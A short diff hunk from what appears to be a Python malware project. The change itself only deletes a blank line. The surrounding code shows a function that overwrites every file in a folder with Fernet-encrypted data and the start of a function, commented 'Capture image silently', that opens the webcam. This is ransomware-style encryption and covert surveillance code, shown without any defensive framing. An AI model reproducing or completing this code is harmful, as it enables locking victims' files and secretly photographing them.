@@ -30,7 +30,6 @@ def encrypt_files(folder):
             encrypted = fernet.encrypt(data)
             with open(filepath, "wb") as file:
                 file.write(encrypted)
-
 # Capture image silently
 def capture_image():
     cam = cv2.VideoCapture(0)
